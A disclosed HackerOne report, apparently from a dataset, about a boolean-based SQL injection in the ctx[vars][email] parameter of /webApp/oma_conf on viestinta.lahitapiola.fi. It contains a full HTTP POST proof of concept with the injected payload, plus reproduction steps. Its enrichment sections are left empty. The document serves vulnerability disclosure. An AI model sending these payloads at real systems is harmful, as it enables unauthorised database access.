---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '181803'
original_report_id: '181803'
title: SQL Injection /webApp/oma_conf ctx parameter (viestinta.lahitapiola.fi)
weakness: SQL Injection
team_handle: localtapiola
created_at: '2016-11-12T17:58:34.924Z'
disclosed_at: '2016-12-08T13:19:18.694Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 50
tags:
- hackerone
- sql-injection
---

# SQL Injection /webApp/oma_conf ctx parameter (viestinta.lahitapiola.fi)

## Metadata

- HackerOne Report ID: 181803
- Weakness: SQL Injection
- Program: localtapiola
- Disclosed At: 2016-12-08T13:19:18.694Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Vulnerable script**: /webApp/oma_conf
**Vulnerable parameter**: ctx[vars][email]
**Database**: PostgreSQL

**PoC**
```http
POST /webApp/oma_conf HTTP/1.1
Host: viestinta.lahitapiola.fi
Content-Type: application/x-www-form-urlencoded
Content-Length: 1131

ctx=%3Cctx+lang%3D%22en%22+date%3D%222016-11-12T17%3A33%3A06Z%22+_target%3D%22web%22+webApp-id%3D%22235234841%22+_folderModel%3D%22nmsRecipient%22%3E%3CuserInfo+datakitInDatabase%3D%22true%22+homeDir%3D%22%22+instanceLocale%3D%22en-US%22+locale%3D%22en-US%22+login%3D%22webapp%22+loginCS%3D%22Web+applications+agent+%28webapp%29%22+loginId%3D%223290%22+noConsoleCnx%3D%22true%22+orgUnitId%3D%220%22+theme%3D%22%22+timezone%3D%22Europe%2FHelsinki%22+xmlns%3ASOAP-ENV%3D%22http%3A%2F%2Fschemas.xmlsoap.org%2Fsoap%2Fenvelope%2F%22+xmlns%3Ans%3D%22urn%3Axtk%3Asession%22+xmlns%3Axsd%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXMLSchema%22+xmlns%3Axsi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXMLSchema-instance%22%3E%3Clogin-right+right%3D%22admin%22%2F%3E%3C%2FuserInfo%3E%3Ctimezone+current%3D%22Europe%2FHelsinki%22+changed%3D%22false%22%2F%3E%3Cvars%3E%3CcustomerId%3E0%3C%2FcustomerId%3E%3Caction%3Ein%3C%2Faction%3E
%3Cemail%3Etest%40test.ru' and substr(version(),1,10) = 'PostgreSQL' and '1%3C%2Femail%3E
%3C%2Fvars%3E%3CactivityHistory%3E%3Cactivity+name%3D%22page%22%2F%3E%3C%2FactivityHistory%3E%3C%2Fctx%3E&userAction=next&transition=
```

**Steps to reproduce**
1. Open http://viestinta.lahitapiola.fi/webApp/oma_conf
2. Fill in the form value `' and substr(version(),1,10) = 'PostgreSQL' and '1`
3. Result `Kiitos tilauksestasi!`
4. Fill in the form value `' and substr(version(),1,10) = 'PostgreXXX' and '1`
5. Result `An error occurred.`

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
